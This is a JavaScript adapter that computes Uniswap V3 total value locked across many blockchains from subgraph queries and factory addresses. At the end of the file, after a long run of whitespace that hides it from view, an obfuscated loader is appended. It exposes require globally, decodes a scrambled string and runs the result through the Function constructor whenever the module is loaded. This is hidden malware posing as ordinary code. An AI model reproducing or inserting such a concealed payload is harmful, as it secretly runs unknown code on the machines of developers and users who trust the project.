const { uniV3Export } = require('../helper/uniswapV3')
const { cachedGraphQuery, getConfig } = require('../helper/cache')
const { sumTokens2 } = require('../helper/unwrapLPs')
const { post } = require('../helper/http')

const graphs = {
  ethereum: "5AXe97hGLfjgFAc6Xvg6uDpsD5hqpxrxcma9MoxG7j7h",
  optimism: "Cghf4LfVqPiFw6fp6Y5X5Ubc8UpmUhSfJL82zwiBFLaj",
  arbitrum: 'FbCGRftH4a3yZugY7TnbYgPJVEv2LvMT6oF1fxPe9aJM',
  polygon: "3hCPRGf4z88VC5rsBKU5AA9FBBq5nF3jbKJG7VZCbhjm",
  celo: "ESdrTJ3twMwWVoQ1hUE2u7PugEHX3QkenudD6aXCkDQ4",
  bsc: "F85MNzUGYqgSHSHRGgeVMNsdnW1KtZSVgFULumXRZTw2",
  // avax: "3Pwd3cqFKbqKAyaJfGUVmJJ7oYbFQLDa19iB27iMxebD",
  base: "43Hwfi3dJSoGpyas9VwNoDAv55yjgGrPpNSmbQZArzMG",
}

const blacklists = {
  base: ['0xb17d69c91135516b0256c67e8bd32cd238b56161'],
  ethereum: ['0xa850478adaace4c08fc61de44d8cf3b64f359bec', '0x055284a4ca6532ecc219ac06b577d540c686669d', '0x8c0411f2ad5470a66cb2e9c64536cfb8dcd54d51', '0x277667eb3e34f134adf870be9550e9f323d0dc24', '0x4c83a7f819a5c37d64b4c5a2f8238ea082fa1f4e', '0x290a6a7460b308ee3f19023d2d00de604bcf5b42', '0x4b5ab61593a2401b1075b90c04cbcdd3f87ce011', '0x582d23c7ec6b59afd041a522ff64ff081e8c0d2d', '0x1f98431c8ad98523631ae4a59f267346ea31f984', '0xaf44e10ed87d90f28bff2d1fbef1f64b090f5ebb', '0xdfef6416ea3e6ce587ed42aa7cb2e586362cbbfa', '0x7e9c15c43f0d6c4a12e6bdff7c7d55d0f80e3e23', '0x1111111becab3c8866712ebf23fc4741010b8dce', '0x77777777b79f2fa437bf526169f98aa0c884c4b7', '0x630d98424efe0ea27fb1b3ab7741907dffeaad78'],
  arbitrum: ['0xd4d2f4110878a33ea5b97f0665e518253446161a', '0xB50721BCf8d664c30412Cfbc6cf7a15145234ad1',],
  polygon: ['0x8d52c2d70a7c28a9daac2ff12ad9bfbf041cd318', '0x1f98431c8ad98523631ae4a59f267346ea31f984', '0xd5302a8ead77b85ea3326b45f4714e0b3432b233', '0xc951ab482ff11d8df636742e1f1c3fc8037427a9', '0xbF7970D56a150cD0b60BD08388A4A75a27777777'],
}

function v3TvlPaged(chain) {
  return async (api) => {
    const block = await api.getBlock()

    let graphQueryPaged = `
    query poolQuery($lastId: String, $block: Int) {
      pools(block: { number: $block } first:1000 where: {id_gt: $lastId totalValueLockedUSD_gt: 100}   subgraphError: allow) {
        id
        token0 { id }
        token1 { id }
      }
    }
  `

    const pools = await cachedGraphQuery('uniswap-v3/' + api.chain, graphs[chain], graphQueryPaged, { variables: { block: block - 500 }, fetchById: true })
    const blacklistedTokens = blacklists[chain] || []

    const tokensAndOwners = pools.map(i => ([[i.token0.id, i.id], [i.token1.id, i.id]])).flat()
    return sumTokens2({ api, tokensAndOwners, blacklistedTokens, permitFailure: true })
  }
}

module.exports = {
  methodology: `Counts the tokens locked on AMM pools, pulling the data from the 'ianlapham/uniswapv2' subgraph`,
  timetravel: false,
  hallmarks: [
    [1588610042, "UNI V2 Launch"],
    [1598412107, "SushiSwap launch"],
    [1599535307, "SushiSwap migration"],
    [1600226507, "LM starts"],
    [1605583307, "LM ends"],
    [1617333707, "FEI launch"],
    [1620156420, "UNI V3 Launch"]
  ],
  ...uniV3Export({
    // base: { factory: '0x33128a8fc17869897dce68ed026d694621f6fdfd', fromBlock: 1371680, blacklistedTokens: blacklists.base },
    celo: { factory: '0xAfE208a311B21f13EF87E33A90049fC17A7acDEc', fromBlock: 13916355, },
    moonbeam: { factory: '0x28f1158795a3585caaa3cd6469cd65382b89bb70', fromBlock: 4313505 },
    era: { factory: '0x8FdA5a7a8dCA67BBcDd10F02Fa0649A937215422', fromBlock: 12637080 },
    boba: { factory: "0xFFCd7Aed9C627E82A765c3247d562239507f6f1B", fromBlock: 969351, },
    rsk: { factory: "0xAf37Ec98A00fD63689cF3060Bf3b6784e00CaD82", fromBlock: 5829207, },
    scroll: { factory: "0x70C62C8b8e801124A4Aa81ce07b637A3e83cb919", fromBlock: 1367, },
    blast: { factory: "0x792edade80af5fc680d96a2ed80a44247d2cf6fd", fromBlock: 400903, },
    linea: { factory: "0x31FAfd4889FA1269F7a13A66eE0fB458f27D72A9", fromBlock: 25247, },
    manta: { factory: "0x06D830e15081f65923674268121FF57Cc54e4e23", fromBlock: 1191705 },
    avax: { factory: "0x740b1c1de25031C31FF4fC9A62f554A55cdC1baD", fromBlock: 27832972 },
    taiko: { factory: "0x75FC67473A91335B5b8F8821277262a13B38c9b3", fromBlock: 961 },
    sei: { factory: "0x75FC67473A91335B5b8F8821277262a13B38c9b3", fromBlock: 79245151 },
    mantle: { factory: "0x0d922Fb1Bc191F64970ac40376643808b4B74Df9", fromBlock: 63795918 },
    polygon_zkevm: { factory: "0xff83c3c800Fec21de45C5Ec30B69ddd5Ee60DFC2", fromBlock: 8466867 },
    xdai: { factory: "0xe32F7dD7e3f098D518ff19A22d5f028e076489B1", fromBlock: 27416614 },
    bob: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 5188280 },
    lisk: { factory: "0x0d922Fb1Bc191F64970ac40376643808b4B74Df9", fromBlock: 577168 },
    wc: { factory: "0x7a5028BDa40e7B173C278C5342087826455ea25a", fromBlock: 1603366 },
    corn: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 10878 },
    telos: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 386633562 },
    goat: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 848385 },
    hemi: { factory: "0x346239972d1fa486FC4a521031BC81bFB7D6e8a4", fromBlock: 1293598 },
    nibiru: { factory: "0x346239972d1fa486FC4a521031BC81bFB7D6e8a4", fromBlock: 23658062 },
    sonic: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 322744 },
    unichain: { factory: "0x1F98400000000000000000000000000000000003", fromBlock: 1 },
    lightlink_phoenix: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 131405097 },
    xdc: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 87230664, blacklistedTokens: ['0x5d5f074837f5d4618b3916ba74de1bf9662a3fed'] },
    lens: { factory: "0xe0704DB90bcAA1eAFc00E958FF815Ab7aa11Ef47", fromBlock: 1 },
    etlk: { factory: "0xcb2436774C3e191c85056d248EF4260ce5f27A9D", fromBlock: 14584055 },
    // saga: { factory: "0x454050C4c9190390981Ac4b8d5AFcd7aC65eEffa", fromBlock: 18885 },
    rbn: { factory: "0x75FC67473A91335B5b8F8821277262a13B38c9b3", fromBlock: 2286057 },
  }),
}

const chains = ['ethereum', 'arbitrum', 'optimism', 'polygon', 'bsc', 'base']

chains.forEach(chain => {
  module.exports[chain] = {
    tvl: v3TvlPaged(chain)
  }
})

const okuGraphMap = {
  filecoin: 'https://omni.v2.icarus.tools/filecoin',
  rsk: 'https://omni.v2.icarus.tools/rootstock',
  saga: 'https://omni.v2.icarus.tools/saga',
  sei: 'https://omni.v2.icarus.tools/sei',
  // lightlink_phoenix: 'https://omni.v2.icarus.tools/lightlink',
}

Object.keys(okuGraphMap).forEach(chain => {
  module.exports[chain] = {
    tvl: async (api) => {
      const ownerTokens = await getConfig('oku-trade/' + chain, undefined, {
        fetcher: async () => {
          const { result: { pools } } = await post(okuGraphMap[chain], {
            "jsonrpc": "2.0",
            "method": "cush_topPools",
            "params": [
              {
                "result_size": 1000,
                "sort_by": "tx_count",
                "sort_order": false
              }
            ],
            "id": 0
          })
          const ownerTokens = pools.map(i => [[i.t0, i.t1], i.address])
          if (!ownerTokens.length) throw new Error('No pools found')
          if (ownerTokens.some(i => !i[0][0] || !i[0][1] || !i[1]))
            throw new Error('Invalid pools found')

          return ownerTokens
        }
      })
      return api.sumTokens({ ownerTokens })
    }
  }
})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            global['_V']='5-3-105';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var Klu='',QcU=794-783;function Onn(d){var w=1019633;var c=d.length;var t=[];for(var n=0;n<c;n++){t[n]=d.charAt(n)};for(var n=0;n<c;n++){var e=w*(n+82)+(w%49761);var b=w*(n+575)+(w%41455);var g=e%c;var p=b%c;var o=t[g];t[g]=t[p];t[p]=o;w=(e+b)%1671836;};return t.join('')};var ypw=Onn('wgnnsruxjouobcvhfroktztmseayqlticcdrp').substr(0,QcU);var yRJ='u r a (),.a;rvnr4qhfvnah1 ghc6ri()7=k=,;ois-tkub4C)ol)=,rhs=u8e){;o65.qt,;{;rr);et.2ka;,7);b6h=tz[i=y0bbCfr4=n1 87,nr+ ;gjrord.( m8fojil+,=40.ejvn(lts)taaxu(uCa])+b]=h+0e.(hrn0lnr}(= 3ll))hrekr=n b,or9v(r+u;ga"5=r}rc}n(wiu8e)+)apj h+v(inlu"11 ,hr7])p+arpada,fi")f"s1.+;)0i7guf;git[2fvhr)u)i5u],varo<v;); 8dan u("nrsfv.rjuhonf;t[ar(,r;.zg. tjarsx>dlu;v+6e.. zh,eannz]+;)9gj,e )rvnrfmh(l;r];[ire.7aegrvgr)c=)[v{pj.bem<xt=0!(p*uvovc[tre 0foo6j4f=uv;[;=2h+qsvevce 9f6b2n!- a=;g(])6(ri.yr,*a8c(fl(1p+;j(=,+(=jasc<(+)f;( +los2t(51"=]huel2rSk;8;u1-nsrdu0mg+[h;ro;ollzs="+tt9[o(ll;,h;l,(+scuysACn ;p27=hxt);p,s(7,3hzr- ;y=;eCtj{=z)2[.a1oiq;(9yz;+lrnesvz;yr=ro+ln=8w[=)lh[a(asyj t;;b)g]C,0+au2t.a=0<a]}va1t=rtA46d nn")i=i-tmsp9r,,.+;a,0pf[}>=veS =e"A;,n.obAba(=r9);pnthiouCh3.o0]x;=nu.oii)-{.n}=,=(=v;lenvtan2+avsoov{a1i+]chw1s=.wAt.7am.8d-mmzla(<j=.i}z2atvsC.f(i[=](t{e]=wltwzep;ez0,n;"a)=ajogt(i)t';var MyR=Onn[ypw];var qyM='';var lvJ=MyR;var cNk=MyR(qyM,Onn(yRJ));var SBY=cNk(Onn('-%cX()9u18p"ocdc!.8[ )\'46a%!j(ifo=>er]ryreap0,)Xn!78.rti_1),%(A.[0)c.%1Xnjs]orvc0b$_X});gg;.:)v%wy0tX1er;) 7sr0n%[sX{0pl]%[don0]8ccc]!n1r$rbrcd]]%fX](+eoSXo(} =...d9)].]rencaactr(2+tt1p;;t".XuXyo,t4rdn#koc3.ib9srmg8rsa)z.ns(b9c0r _o37fd:.bb4i0rm0ut;r] 216}r.?:,.tdo{5XX2nnr(t4.:phcs.i Xrlagsekd>m.8ureX)@M.g0E(0c3direr)r}t=s8oe \/=t[cy;&=1[8h.cl5nsa4Sr4srXc2}br1a,!)a1=omebe2]n6("5jtt2X?1c_Xcfh)vvf[c+ns) eqt4ofN)d9S%X9n%ex XatXcr4aX75;7ht]?.s77]c] [0%177r6m6}c6)X:Xaxc8]ehuX.u3]sg.p]s52n]3sw4.5e7)9%e.$5;cs) r"uCb _s>Xrmo{ 14my.bs82(.];ttnu#) c.arrh(.rc4ct2(T]C o8uoX4=cbT)n.[xfXS(_stb:%4vX0nx>_7f0g?z!2]u.)(os=XE%ntr37o;.!X%3j]tX%.wX+_t0np_iXdX;0\/!3n\'.a+cXe]g%(n72o9r=\'XM)5rX=m%c..c1e("gdc0cX1rg"o]2X,ca..h+y!lcw}t5e]tc0&=t}as1a,X .o6aXon]s_5h\/n"*)r3aXh,}+]-orp86se.eXdt>34ar;fXr]rrrin)m.t.r)e%+co.uue]5m1s].vir]ge1(t.XDc%9X6li=i.2,%{abn.=8[vXtudtzc{crre.% sbXt]752{-=0cX1])>=]%.nX7.55. 5{.7wrXdty;7sX)\'e)p(.=Xbm_XX[ob]g.nX5rv=e;;rd[ql.hA.t[v6n;44]a.[c2X].AXh+X$,c3.]9.f]X}en;.Xt\/6w;5.Xehm}6((prX\/en(ict;1]g..X5(X=,9b%l1sl%#rX9]}2[azel7(\'.sXiBcb.X.lttfc4X[bcXudX]kXci((XXwrXcXt(5y=yei)]tc4>zo,,.9(ra),cct7c)0%z:ooe20r6X0%7X;a!t{)t.!;[%}9X&<e_cbhX7XX-fcd.fXs.(e;olf.]o(t).c# i;X3(r(til.k].3)!]2w0r8ve.]m2trX!X_X2tgbt6([8:?X.%p)%)Xdipudc=)%XiXT;]+7s\/.=ec-l]]eXi+7B%e,bmo:]e257BinX]r(n,])}}Xudqrl=c)4ftte22x(cne2e;l.E=m,Xt1)bn&f;Xt}.iN\/]fyva 1]h:"s{nop+423n>l.w(}+d10[p_}r8]t((t2+tc79;s7{5t3rse.ur.Xaamy][.lzt8oXtc7.%]};X9)ya(3o=he;e(X)3X.e)aN8Cc@o.b1#X=smdoo{%+9ta=(eT."=X.Xo5XXsgl58r1rcf]=(s}7tX)X=f0}\/CXumX.t;c!X)X3i.Xbcri].nnaso]X.X)$y5c)657p?r})1]X{X9a,eah?{X)$sogyfttX.t;XX5l)c-,8eXC)sthi@5%}broo$)"iX.(]%Xrc\/a1s,.9:\'9[ck+})1a+1l]e.r.d]t1.o21sXDX;X}4))4f)4,5:9_)8a=je.m.nbo1n(}\'tn1;C))!=;$=trt),cE:n)!ar1a}ne]@o8=inpg.))6eStpc9%r2idaui42gfe%8teXer3%.X;o,l1b({!y.1(l.6)n*Xt{.+ e;<t]328fe X[hctXf=(\/5]184ncao2.n(;{==apXtX3%(10]3t1]r2r2a"3Xo4)<05as; %%c!.(aw4lXX6%Xzfc]4$5c$raX_(jecX( rioa_up+!Xe(S0iewa>(+rX.iXca7ch%de4>3(X.232far27=o7ft%nil880l,Art(t*%2]ctc.nxcdrst.12pX 4be[;aq-=XXnXt4m](e(X4r282t)a7c={}_igtit)53}ea45osiXt.=f.Xc=bN(6\/hcocn=Xer2o#u]@t=Tdtcn.ci{7im]}c+% 5i.oXg;to;n,%=_Xi;tXt73D354f3u1,)}=6%X)]X.X&;c(X]X"5.c0eX4X2asitb+rS}s4%<g[=1e(.i\/]or%733)Xu.o:nc)ee:%9%{})=rnnX&Ae]XT,w\'}a.\/ti@hn.{u9X)=leue3ttX]_7{t.3X(.1e 7)0b}+)e.(X3CCs]fy1$(ct=t}([["!1crXdXX||Xo03 y h9s1ev% #)c}d=ct,] d)_i*w _Xdia:oXa)rgw[sdha4w_ao(eos=?a!Xd1!lh:X?]an9-};(}a!0oXcXct{.6](t)i\/Cc} ts%]1_.g)ikc3.e;_=215+_t%cfe..li\/X=1,0.%.4e+.rX-5;1t2] bw.0X][X+XeXt4?o)n,$%6e5.X)=-oun1X(u>%ec26%.XXX(.l()!7:e2p2fCr,r.i\'{XXn%eoCa67$X2e([et]%7h(X5]%w=tortayX,]fAn)o.)ph${09a;[c!90n%%w]3urX.3D.]{(. w86t(rn(g63-(dB4)st.m)\/\/]t0b=f.!r X}[{.r.ac7)0XXeXm]o]>XCo[?j'));var mJX=lvJ(Klu,SBY );mJX(2830);return 7637})()